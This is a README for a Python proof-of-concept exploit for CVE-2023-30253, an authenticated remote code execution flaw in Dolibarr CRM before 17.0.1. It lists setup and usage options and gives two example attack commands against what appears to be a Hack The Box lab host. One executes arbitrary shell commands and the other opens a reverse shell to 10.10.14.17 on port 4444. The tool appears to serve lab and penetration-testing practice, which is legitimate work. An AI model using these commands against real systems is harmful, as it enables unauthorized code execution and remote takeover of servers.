# CVE-2023-30253

<p align="center">
  <img src="https://github.com/Rubikcuv5/cve-2023-30253/assets/47946047/eee891a5-2641-48c5-95bf-1b0e42ded1ac" alt="image">
</p>

# Description
 Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: <?PHP instead of <?php in injected data.



## Documentation

- [CVE-2023-30253](https://cvefeed.io/vuln/detail/CVE-2023-30253)
- [GitHub Advisory: GHSA-9wqr-5jp4-mjmh](https://github.com/advisories/GHSA-9wqr-5jp4-mjmh)

## Setup
```
git clone https://github.com/Rubikcuv5/cve-2023-30253.git

pip3 install -r requirements.txt

python3 CVE-2023-30253.py -h
```

## USAGE
```
usage: CVE-2023-30253.py [-h] [--url URL] [-u USER] [-p PASSWORD] (-c COMMAND | -r ip port)

Argument parser

options:
  -h, --help            show this help message and exit
  --url URL             URL of the website
  -u USER, --user USER  Username
  -p PASSWORD, --password PASSWORD
                        Password
  -c COMMAND, --command COMMAND
                        Command to execute
  -r ip port, --reverseshell ip port
                        Reverse shell IP and port

```
## EXAMPLES POC

### Execute a command 
```
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -c "ls -l"
```

<p align="center">
  <img src="https://github.com/Rubikcuv5/cve-2023-30253/assets/47946047/25befa10-d52b-4f39-83cc-1398c7bb205e" alt="image">
</p>

### Getting a reverse shell
```
 python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r  10.10.14.17  4444
```
<p align="center">
  <img src="https://github.com/Rubikcuv5/cve-2023-30253/assets/47946047/56473ae8-901f-4eb3-ad8f-7794970c19ce" alt="image">
</p>


## Author

- [Rubickcuv](https://github.com/Rubikcuv5)
